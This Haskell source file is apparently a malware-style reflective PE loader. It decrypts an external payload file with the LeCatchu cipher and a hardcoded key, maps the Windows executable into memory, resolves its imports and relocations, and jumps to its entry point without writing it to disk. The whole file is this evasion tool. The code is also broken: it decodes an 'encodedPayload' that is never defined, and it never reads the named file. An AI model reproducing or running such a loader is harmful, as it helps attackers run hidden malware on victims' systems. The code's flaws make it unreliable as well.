{-# LANGUAGE ForeignFunctionInterface #-}
{-# LANGUAGE RecordWildCards #-}
{-# LANGUAGE BangPatterns #-}

module Main where

import Foreign
import Foreign.C.Types
import Foreign.C.String
import Numeric (showHex)
import qualified Data.ByteString as BS
import qualified Data.ByteString.Char8 as C8
import qualified Data.ByteString.Unsafe as BSU
import Control.Monad
import Control.Exception
import System.IO (hSetBuffering, BufferMode(LineBuffering), stdout, stderr, hFlush)
import System.Timeout (timeout)
import System.Exit (exitFailure)
import System.Environment (getArgs)

-- Import LeCatchu cryptographic library
import LeCatchu

-- ============================================
-- CONFIGURATION
-- ============================================

-- Default encrypted payload filename
defaultPayloadFile :: String
defaultPayloadFile = "encrypted_payload.bin"

-- ============================================
-- WINDOWS API FFI BINDINGS
-- ============================================

foreign import ccall "windows.h VirtualAlloc"
  c_VirtualAlloc :: Ptr () -> CSize -> Word32 -> Word32 -> IO (Ptr ())

foreign import ccall "windows.h VirtualProtect"
  c_VirtualProtect :: Ptr () -> CSize -> Word32 -> Ptr Word32 -> IO Int

foreign import ccall "windows.h LoadLibraryA"
  c_LoadLibraryA :: CString -> IO (Ptr ())

foreign import ccall "windows.h GetProcAddress"
  c_GetProcAddress :: Ptr () -> CString -> IO (Ptr ())

foreign import ccall "windows.h FlushInstructionCache"
  c_FlushInstructionCache :: Ptr () -> Ptr () -> CSize -> IO Int

foreign import ccall "windows.h GetCurrentProcess"
  c_GetCurrentProcess :: IO (Ptr ())

foreign import ccall "windows.h GetLastError"
  c_GetLastError :: IO Word32

-- ============================================
-- SAFETY LIMITS
-- ============================================

maxImageSizeBytes :: Int
maxImageSizeBytes = 200 * 1024 * 1024  -- 200 MB

loaderTimeoutMicros :: Int
loaderTimeoutMicros = 30 * 1000000     -- 30 seconds

-- ============================================
-- CONSTANTS
-- ============================================

mEM_COMMIT, mEM_RESERVE :: Word32
mEM_COMMIT = 0x1000
mEM_RESERVE = 0x2000

pAGE_NOACCESS, pAGE_READONLY, pAGE_READWRITE :: Word32
pAGE_NOACCESS = 0x01
pAGE_READONLY = 0x02
pAGE_READWRITE = 0x04

pAGE_EXECUTE, pAGE_EXECUTE_READ, pAGE_EXECUTE_READWRITE :: Word32
pAGE_EXECUTE = 0x10
pAGE_EXECUTE_READ = 0x20
pAGE_EXECUTE_READWRITE = 0x40

iMAGE_DIRECTORY_ENTRY_IMPORT :: Int
iMAGE_DIRECTORY_ENTRY_IMPORT = 1

iMAGE_DIRECTORY_ENTRY_BASERELOC :: Int
iMAGE_DIRECTORY_ENTRY_BASERELOC = 5

iMAGE_DIRECTORY_ENTRY_TLS :: Int
iMAGE_DIRECTORY_ENTRY_TLS = 9

dLL_PROCESS_ATTACH :: Word32
dLL_PROCESS_ATTACH = 1

-- ============================================
-- PE STRUCTURES (keeping original structures)
-- ============================================

data ImageDosHeader = ImageDosHeader
  { dos_e_magic :: !Word16
  , dos_e_lfanew :: !Int32
  } deriving (Show)

instance Storable ImageDosHeader where
  sizeOf _ = 64
  alignment _ = 4
  peek ptr = ImageDosHeader
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 60
  poke ptr (ImageDosHeader magic lfanew) = do
    pokeByteOff ptr 0 magic
    pokeByteOff ptr 60 lfanew

data ImageFileHeader = ImageFileHeader
  { fh_machine :: !Word16
  , fh_numberOfSections :: !Word16
  , fh_timeDateStamp :: !Word32
  , fh_pointerToSymbolTable :: !Word32
  , fh_numberOfSymbols :: !Word32
  , fh_sizeOfOptionalHeader :: !Word16
  , fh_characteristics :: !Word16
  } deriving (Show)

instance Storable ImageFileHeader where
  sizeOf _ = 20
  alignment _ = 4
  peek ptr = ImageFileHeader
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 2
    <*> peekByteOff ptr 4
    <*> peekByteOff ptr 8
    <*> peekByteOff ptr 12
    <*> peekByteOff ptr 16
    <*> peekByteOff ptr 18
  poke _ _ = error "ImageFileHeader poke not implemented"

data ImageOptionalHeader64 = ImageOptionalHeader64
  { oh_magic :: !Word16
  , oh_majorLinkerVersion :: !Word8
  , oh_minorLinkerVersion :: !Word8
  , oh_sizeOfCode :: !Word32
  , oh_sizeOfInitializedData :: !Word32
  , oh_sizeOfUninitializedData :: !Word32
  , oh_addressOfEntryPoint :: !Word32
  , oh_baseOfCode :: !Word32
  , oh_imageBase :: !Word64
  , oh_sectionAlignment :: !Word32
  , oh_fileAlignment :: !Word32
  , oh_majorOperatingSystemVersion :: !Word16
  , oh_minorOperatingSystemVersion :: !Word16
  , oh_majorImageVersion :: !Word16
  , oh_minorImageVersion :: !Word16
  , oh_majorSubsystemVersion :: !Word16
  , oh_minorSubsystemVersion :: !Word16
  , oh_win32VersionValue :: !Word32
  , oh_sizeOfImage :: !Word32
  , oh_sizeOfHeaders :: !Word32
  , oh_checkSum :: !Word32
  , oh_subsystem :: !Word16
  , oh_dllCharacteristics :: !Word16
  , oh_sizeOfStackReserve :: !Word64
  , oh_sizeOfStackCommit :: !Word64
  , oh_sizeOfHeapReserve :: !Word64
  , oh_sizeOfHeapCommit :: !Word64
  , oh_loaderFlags :: !Word32
  , oh_numberOfRvaAndSizes :: !Word32
  } deriving (Show)

instance Storable ImageOptionalHeader64 where
  sizeOf _ = 112
  alignment _ = 8
  peek ptr = ImageOptionalHeader64
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 2
    <*> peekByteOff ptr 3
    <*> peekByteOff ptr 4
    <*> peekByteOff ptr 8
    <*> peekByteOff ptr 12
    <*> peekByteOff ptr 16
    <*> peekByteOff ptr 20
    <*> peekByteOff ptr 24
    <*> peekByteOff ptr 32
    <*> peekByteOff ptr 36
    <*> peekByteOff ptr 40
    <*> peekByteOff ptr 42
    <*> peekByteOff ptr 44
    <*> peekByteOff ptr 46
    <*> peekByteOff ptr 48
    <*> peekByteOff ptr 50
    <*> peekByteOff ptr 52
    <*> peekByteOff ptr 56
    <*> peekByteOff ptr 60
    <*> peekByteOff ptr 64
    <*> peekByteOff ptr 68
    <*> peekByteOff ptr 70
    <*> peekByteOff ptr 72
    <*> peekByteOff ptr 80
    <*> peekByteOff ptr 88
    <*> peekByteOff ptr 96
    <*> peekByteOff ptr 104
    <*> peekByteOff ptr 108
  poke _ _ = error "ImageOptionalHeader64 poke not implemented"

data ImageDataDirectory = ImageDataDirectory
  { dd_virtualAddress :: !Word32
  , dd_size :: !Word32
  } deriving (Show)

instance Storable ImageDataDirectory where
  sizeOf _ = 8
  alignment _ = 4
  peek ptr = ImageDataDirectory
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 4
  poke _ _ = error "ImageDataDirectory poke not implemented"

data ImageNtHeaders64 = ImageNtHeaders64
  { nt_signature :: !Word32
  , nt_fileHeader :: !ImageFileHeader
  , nt_optionalHeader :: !ImageOptionalHeader64
  } deriving (Show)

instance Storable ImageNtHeaders64 where
  sizeOf _ = 4 + 20 + 112
  alignment _ = 8
  peek ptr = ImageNtHeaders64
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 4
    <*> peekByteOff ptr 24
  poke _ _ = error "ImageNtHeaders64 poke not implemented"

data ImageSectionHeader = ImageSectionHeader
  { sec_name :: ![Word8]
  , sec_virtualSize :: !Word32
  , sec_virtualAddress :: !Word32
  , sec_sizeOfRawData :: !Word32
  , sec_pointerToRawData :: !Word32
  , sec_pointerToRelocations :: !Word32
  , sec_pointerToLinenumbers :: !Word32
  , sec_numberOfRelocations :: !Word16
  , sec_numberOfLinenumbers :: !Word16
  , sec_characteristics :: !Word32
  } deriving (Show)

instance Storable ImageSectionHeader where
  sizeOf _ = 40
  alignment _ = 4
  peek ptr = do
    name <- mapM (peekByteOff ptr) [0..7]
    ImageSectionHeader name
      <$> peekByteOff ptr 8
      <*> peekByteOff ptr 12
      <*> peekByteOff ptr 16
      <*> peekByteOff ptr 20
      <*> peekByteOff ptr 24
      <*> peekByteOff ptr 28
      <*> peekByteOff ptr 32
      <*> peekByteOff ptr 34
      <*> peekByteOff ptr 36
  poke _ _ = error "ImageSectionHeader poke not implemented"

data ImageImportDescriptor = ImageImportDescriptor
  { id_originalFirstThunk :: !Word32
  , id_timeDateStamp :: !Word32
  , id_forwarderChain :: !Word32
  , id_name :: !Word32
  , id_firstThunk :: !Word32
  } deriving (Show)

instance Storable ImageImportDescriptor where
  sizeOf _ = 20
  alignment _ = 4
  peek ptr = ImageImportDescriptor
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 4
    <*> peekByteOff ptr 8
    <*> peekByteOff ptr 12
    <*> peekByteOff ptr 16
  poke _ _ = error "ImageImportDescriptor poke not implemented"

data ImageBaseRelocation = ImageBaseRelocation
  { br_virtualAddress :: !Word32
  , br_sizeOfBlock :: !Word32
  } deriving (Show)

instance Storable ImageBaseRelocation where
  sizeOf _ = 8
  alignment _ = 4
  peek ptr = ImageBaseRelocation
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 4
  poke _ _ = error "ImageBaseRelocation poke not implemented"

data ImageTlsDirectory64 = ImageTlsDirectory64
  { tls_startAddressOfRawData :: !Word64
  , tls_endAddressOfRawData :: !Word64
  , tls_addressOfIndex :: !Word64
  , tls_addressOfCallbacks :: !Word64
  , tls_sizeOfZeroFill :: !Word32
  , tls_characteristics :: !Word32
  } deriving (Show)

instance Storable ImageTlsDirectory64 where
  sizeOf _ = 40
  alignment _ = 8
  peek ptr = ImageTlsDirectory64
    <$> peekByteOff ptr 0
    <*> peekByteOff ptr 8
    <*> peekByteOff ptr 16
    <*> peekByteOff ptr 24
    <*> peekByteOff ptr 32
    <*> peekByteOff ptr 36
  poke _ _ = error "ImageTlsDirectory64 poke not implemented"

-- ============================================
-- HELPER FUNCTIONS (keeping all original PE loading logic)
-- ============================================

getDataDirectory :: Ptr ImageNtHeaders64 -> Int -> IO (Ptr ImageDataDirectory)
getDataDirectory ntPtr index = do
  let optHeaderPtr = plusPtr ntPtr 24
      dataDirPtr = plusPtr optHeaderPtr 112
  return $ plusPtr dataDirPtr (index * 8)

setSectionPermissions :: Ptr Word8 -> ImageSectionHeader -> IO ()
setSectionPermissions imageBase section = do
  let characteristics = sec_characteristics section
      protect = calculateProtection characteristics
      sectionStart = plusPtr imageBase (fromIntegral $ sec_virtualAddress section)
      size = fromIntegral $ sec_virtualSize section
      sizeC = fromIntegral size :: CSize

  alloca $ \oldProtectPtr -> do
    result <- c_VirtualProtect sectionStart sizeC protect oldProtectPtr
    when (result == 0) $ do
      err <- c_GetLastError
      error $ "VirtualProtect failed: " ++ show err

calculateProtection :: Word32 -> Word32
calculateProtection characteristics
  | testBit characteristics 29 =
      if testBit characteristics 31
      then pAGE_EXECUTE_READWRITE
      else if testBit characteristics 30
           then pAGE_EXECUTE_READ
           else pAGE_EXECUTE
  | testBit characteristics 31 = pAGE_READWRITE
  | testBit characteristics 30 = pAGE_READONLY
  | otherwise = pAGE_NOACCESS

processRelocations :: Ptr Word8 -> Ptr ImageNtHeaders64 -> IO ()
processRelocations imageBase ntPtr = do
  relocDir <- getDataDirectory ntPtr iMAGE_DIRECTORY_ENTRY_BASERELOC
  relocDirData <- peek relocDir

  when (dd_virtualAddress relocDirData /= 0) $ do
    optHeader <- nt_optionalHeader <$> peek ntPtr
    let preferredBase = oh_imageBase optHeader
        actualBase = ptrToWordPtr imageBase
        delta = fromIntegral actualBase - fromIntegral preferredBase :: Int64

    when (delta /= 0) $ do
      let relocPtr = plusPtr imageBase (fromIntegral $ dd_virtualAddress relocDirData)
          relocEnd = plusPtr relocPtr (fromIntegral $ dd_size relocDirData)
      processRelocBlock imageBase relocPtr relocEnd delta

processRelocBlock :: Ptr Word8 -> Ptr ImageBaseRelocation -> Ptr ImageBaseRelocation -> Int64 -> IO ()
processRelocBlock imageBase relocPtr relocEnd delta
  | relocPtr >= relocEnd = return ()
  | otherwise = do
      reloc <- peek relocPtr
      when (br_sizeOfBlock reloc > 0) $ do
        let count = (fromIntegral (br_sizeOfBlock reloc) - 8) `div` 2
            entriesPtr = plusPtr relocPtr 8 :: Ptr Word16
        processRelocEntries imageBase (br_virtualAddress reloc) entriesPtr count delta
        let nextPtr = plusPtr relocPtr (fromIntegral $ br_sizeOfBlock reloc)
        processRelocBlock imageBase nextPtr relocEnd delta

processRelocEntries :: Ptr Word8 -> Word32 -> Ptr Word16 -> Int -> Int64 -> IO ()
processRelocEntries imageBase baseVA entriesPtr count delta = go 0
  where
    go i
      | i >= count = return ()
      | otherwise = do
          entry <- peekElemOff entriesPtr i
          let relocType = entry `shiftR` 12
              offset = entry .&. 0xFFF

          when (relocType == 3 || relocType == 10) $ do
            let patchAddr = plusPtr imageBase (fromIntegral baseVA + fromIntegral offset)
            if relocType == 3
              then do
                oldVal <- peek patchAddr :: IO Word32
                poke patchAddr (fromIntegral $ fromIntegral oldVal + delta :: Word32)
              else do
                oldVal <- peek patchAddr :: IO Word64
                poke patchAddr (fromIntegral $ fromIntegral oldVal + delta :: Word64)

          go (i + 1)

resolveImports :: Ptr Word8 -> Ptr ImageNtHeaders64 -> IO ()
resolveImports imageBase ntPtr = do
  importDir <- getDataDirectory ntPtr iMAGE_DIRECTORY_ENTRY_IMPORT
  importDirData <- peek importDir

  when (dd_virtualAddress importDirData /= 0) $ do
    let importDescPtr = plusPtr imageBase (fromIntegral $ dd_virtualAddress importDirData)
    processImportDescriptors imageBase importDescPtr

processImportDescriptors :: Ptr Word8 -> Ptr ImageImportDescriptor -> IO ()
processImportDescriptors imageBase descPtr = do
  desc <- peek descPtr

  when (id_name desc /= 0) $ do
    let dllNamePtr = plusPtr imageBase (fromIntegral $ id_name desc)
    dllModule <- c_LoadLibraryA (castPtr dllNamePtr :: CString)

    when (dllModule == nullPtr) $ do
      err <- c_GetLastError
      error $ "Failed to load DLL (error: " ++ show err ++ ")"

    let thunkRef = if id_originalFirstThunk desc /= 0
                   then plusPtr imageBase (fromIntegral $ id_originalFirstThunk desc)
                   else plusPtr imageBase (fromIntegral $ id_firstThunk desc)
        funcRef = plusPtr imageBase (fromIntegral $ id_firstThunk desc)

    processImportThunks imageBase dllModule thunkRef funcRef
    processImportDescriptors imageBase (plusPtr descPtr (sizeOf desc))

processImportThunks :: Ptr Word8 -> Ptr () -> Ptr Word64 -> Ptr Word64 -> IO ()
processImportThunks imageBase dllModule thunkPtr funcPtr = do
  thunkVal <- peek thunkPtr

  when (thunkVal /= 0) $ do
    funcAddrPtr <- if testBit thunkVal 63
                   then do
                     let ordinal = fromIntegral (thunkVal .&. 0xFFFF) :: Int
                         ordPtr = intPtrToPtr (fromIntegral ordinal)
                     c_GetProcAddress dllModule (castPtr ordPtr :: CString)
                   else do
                     let importByNamePtr = plusPtr imageBase (fromIntegral thunkVal)
                         funcNamePtr = plusPtr importByNamePtr 2
                     c_GetProcAddress dllModule (castPtr funcNamePtr :: CString)

    when (funcAddrPtr == nullPtr) $ do
      err <- c_GetLastError
      error $ "Failed to resolve import (error: " ++ show err ++ ")"

    let funcAddrWord :: Word64
        funcAddrWord = fromIntegral (ptrToWordPtr funcAddrPtr)
    poke funcPtr funcAddrWord

    processImportThunks imageBase dllModule (plusPtr thunkPtr 8) (plusPtr funcPtr 8)

processTlsCallbacks :: Ptr Word8 -> Ptr ImageNtHeaders64 -> IO ()
processTlsCallbacks imageBase ntPtr = do
  tlsDir <- getDataDirectory ntPtr iMAGE_DIRECTORY_ENTRY_TLS
  tlsDirData <- peek tlsDir

  when (dd_virtualAddress tlsDirData /= 0) $ do
    let tlsPtr = plusPtr imageBase (fromIntegral $ dd_virtualAddress tlsDirData)
    tls <- peek tlsPtr :: IO ImageTlsDirectory64

    let callbacksAddr = tls_addressOfCallbacks tls
    when (callbacksAddr /= 0) $
      executeTlsCallbacks imageBase (intPtrToPtr $ fromIntegral callbacksAddr)

executeTlsCallbacks :: Ptr Word8 -> Ptr Word64 -> IO ()
executeTlsCallbacks imageBase callbackPtr = do
  callbackAddr <- peek callbackPtr

  when (callbackAddr /= 0) $ do
    let addr64 = fromIntegral callbackAddr :: Integer
    putStrLn $ "Found TLS callback at address: 0x" ++ showHex addr64 ""
    executeTlsCallbacks imageBase (plusPtr callbackPtr 8)

finalizeSections :: Ptr Word8 -> Ptr ImageNtHeaders64 -> IO ()
finalizeSections imageBase ntPtr = do
  ntHeaders <- peek ntPtr
  let fileHeader = nt_fileHeader ntHeaders
      optHeader = nt_optionalHeader ntHeaders
      numSections = fromIntegral $ fh_numberOfSections fileHeader
      sectionHeaderPtr = plusPtr ntPtr (4 + 20 + fromIntegral (fh_sizeOfOptionalHeader fileHeader))

  forM_ [0..numSections-1] $ \i -> do
    section <- peekElemOff sectionHeaderPtr i
    setSectionPermissions imageBase section

  process <- c_GetCurrentProcess
  let flushSizeC = fromIntegral (oh_sizeOfImage optHeader) :: CSize
  _ <- c_FlushInstructionCache process (castPtr imageBase :: Ptr ()) flushSizeC
  return ()

-- ============================================
-- MAIN PE LOADER
-- ============================================

loadPEFromMemory :: BS.ByteString -> IO ()
loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen) -> do
  putStrLn $ "[*] PE data length: " ++ show dataLen
  hFlush stdout

  when (dataLen < 64) $
    error "PE data too small"

  dosHeader <- peek (castPtr dataPtr :: Ptr ImageDosHeader)
  putStrLn $ "[*] DOS magic: 0x" ++ showHex (dos_e_magic dosHeader :: Word16) ""
  putStrLn $ "[*] e_lfanew: " ++ show (dos_e_lfanew dosHeader)
  hFlush stdout

  when (dos_e_magic dosHeader /= 0x5A4D) $
    error "Invalid MZ signature"

  let ntOffset = fromIntegral $ dos_e_lfanew dosHeader
  when (ntOffset + 264 > dataLen) $
    error "Invalid NT header offset"

  let ntPtr = plusPtr dataPtr ntOffset :: Ptr ImageNtHeaders64
  ntHeaders <- peek ntPtr

  putStrLn $ "[*] NT signature: 0x" ++ showHex (nt_signature ntHeaders) ""
  hFlush stdout
  when (nt_signature ntHeaders /= 0x4550) $
    error "Invalid PE signature"

  let optHeader = nt_optionalHeader ntHeaders
  putStrLn $ "[*] Optional header magic: 0x" ++ showHex (oh_magic optHeader) ""
  hFlush stdout
  when (oh_magic optHeader /= 0x20b) $
    error "Only 64-bit PE files supported"

  putStrLn $ "[*] SizeOfImage: " ++ show (oh_sizeOfImage optHeader)
  putStrLn $ "[*] SizeOfHeaders: " ++ show (oh_sizeOfHeaders optHeader)
  hFlush stdout

  let imageSize = fromIntegral $ oh_sizeOfImage optHeader
  when (imageSize == 0) $
    error "Invalid image size"

  putStrLn $ "[*] Computed image size: " ++ show imageSize ++ " bytes"
  hFlush stdout

  when (imageSize > maxImageSizeBytes) $ do
    putStrLn $ "[!] Refusing to allocate image: size " ++ show imageSize ++ " exceeds limit of " ++ show maxImageSizeBytes ++ " bytes"
    hFlush stdout
    error "Image size exceeds safety limit"

  let imageSizeC = fromIntegral imageSize :: CSize
  imageBase <- c_VirtualAlloc nullPtr imageSizeC (mEM_COMMIT .|. mEM_RESERVE) pAGE_READWRITE
  when (imageBase == nullPtr) $ do
    err <- c_GetLastError
    error $ "VirtualAlloc failed (error: " ++ show err ++ ")"

  putStrLn $ "[*] Allocated image base: 0x" ++ showHex (ptrToWordPtr imageBase) ""
  hFlush stdout

  let imageBasePtr = castPtr imageBase :: Ptr Word8

  let headersSize = fromIntegral $ oh_sizeOfHeaders optHeader
  copyBytes imageBasePtr (castPtr dataPtr) headersSize
  hFlush stdout

  let fileHeader = nt_fileHeader ntHeaders
      numSections = fromIntegral $ fh_numberOfSections fileHeader
      sectionHeaderPtr = plusPtr ntPtr (4 + 20 + fromIntegral (fh_sizeOfOptionalHeader fileHeader))

  putStrLn $ "[*] Number of sections: " ++ show numSections
  hFlush stdout

  forM_ [0..numSections-1] $ \i -> do
    section <- peekElemOff sectionHeaderPtr i
    when (sec_sizeOfRawData section > 0) $ do
      let dest = plusPtr imageBasePtr (fromIntegral $ sec_virtualAddress section)
          src = plusPtr dataPtr (fromIntegral $ sec_pointerToRawData section)
          size = fromIntegral $ sec_sizeOfRawData section
      putStrLn $ "[*] Copying section " ++ show i ++ " size " ++ show size
      hFlush stdout
      copyBytes dest src size

  let ntHeadersInMem = castPtr imageBasePtr `plusPtr` ntOffset :: Ptr ImageNtHeaders64

  processRelocations imageBasePtr ntHeadersInMem
  resolveImports imageBasePtr ntHeadersInMem
  finalizeSections imageBasePtr ntHeadersInMem
  processTlsCallbacks imageBasePtr ntHeadersInMem

  optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
  let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
      entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
      subsystem = oh_subsystem optHeaderInMem

  when (entryPointRVA == 0) $
    error "Invalid entry point"

  let entryAddrWord = ptrToWordPtr entryPointPtr
      entryAddrInteger = fromIntegral entryAddrWord :: Integer

  putStrLn $ "[*] Entry point RVA: 0x" ++ showHex (fromIntegral entryPointRVA :: Integer) ""
  putStrLn $ "[*] Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
  putStrLn $ "[*] Subsystem: " ++ show subsystem
  hFlush stdout
  do
    putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
    hFlush stdout

    if subsystem == 2 || subsystem == 3
      then do
        let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
        rc <- mkEntryPoint entryFunPtr
        putStrLn $ "[*] Entry point returned: " ++ show rc
        hFlush stdout
        return ()
      else do
        let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
        rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
        putStrLn $ "[*] DllMain returned: " ++ show rc
        hFlush stdout
        return ()

-- ============================================
-- LECATCHU DECRYPTION
-- ============================================

secretKey :: String
secretKey = "comp340659"

leCatchuSboxSeed :: String
leCatchuSboxSeed = "Lehncrypt"

leCatchuXBase :: Int
leCatchuXBase = 1

leCatchuInterval :: Int
leCatchuInterval = 1

leCatchuIVLength :: Int
leCatchuIVLength = 256

leCatchuIVXBase :: Int
leCatchuIVXBase = 1

leCatchuIVInterval :: Int
leCatchuIVInterval = 1

leCatchuDecode :: BS.ByteString -> BS.ByteString
leCatchuDecode payload = 
    let engine = newEngine 
            leCatchuSboxSeed
            leCatchuXBase
            Packet
            False
            Nothing
            1114112
            3
        
        decrypted = decryptWithIV engine
            payload
            secretKey
            leCatchuXBase
            leCatchuInterval
            leCatchuIVLength
            leCatchuIVXBase
            leCatchuIVInterval
    in decrypted

-- ============================================
-- FUNCTION POINTER WRAPPERS
-- ============================================

foreign import ccall "dynamic"
  mkEntryPoint :: FunPtr (IO Int32) -> IO Int32

foreign import ccall "dynamic"
  mkDllMain :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
            -> (Ptr () -> Word32 -> Ptr () -> IO Int32)

-- ============================================
-- MAIN
-- ============================================

main :: IO ()
main = do
  hSetBuffering stdout LineBuffering
  hSetBuffering stderr LineBuffering

  putStrLn "[*] PE Loader with LeCatchu v9 Decryption (External Payload)"
  putStrLn "[*] ==========================================================="

  -- Get payload filename from command line or use default
  args <- getArgs
  let payloadFile = if null args then defaultPayloadFile else head args

  putStrLn $ "[*] Payload file: " ++ payloadFile
  hFlush stdout

  let decoded = leCatchuDecode encodedPayload
  putStrLn $ "[*] Decrypted payload size: " ++ show (BS.length decoded) ++ " bytes"
  hFlush stdout

  -- Verify PE signature
  when (BS.length decoded >= 2) $ do
    let mzSig = BS.take 2 decoded
    if mzSig == C8.pack "MZ"
      then putStrLn "[*] Valid MZ signature detected after decryption"
      else putStrLn "[!] WARNING: MZ signature not found after decryption"
    hFlush stdout

  mres <- timeout loaderTimeoutMicros (try (loadPEFromMemory decoded) :: IO (Either SomeException ()))
  case mres of
    Nothing -> do
      putStrLn $ "[!] Timeout: loadPEFromMemory exceeded " ++ show (loaderTimeoutMicros `div` 1000000) ++ " seconds. Exiting."
      hFlush stdout
      exitFailure
    Just (Left ex) -> do
      putStrLn $ "[!] loadPEFromMemory threw exception: " ++ show ex
      hFlush stdout
      exitFailure
    Just (Right _) -> do
      putStrLn "[*] PE loading completed successfully"
      putStrLn "[*] LeCatchu decryption and execution complete"
      hFlush stdout
      return ()
      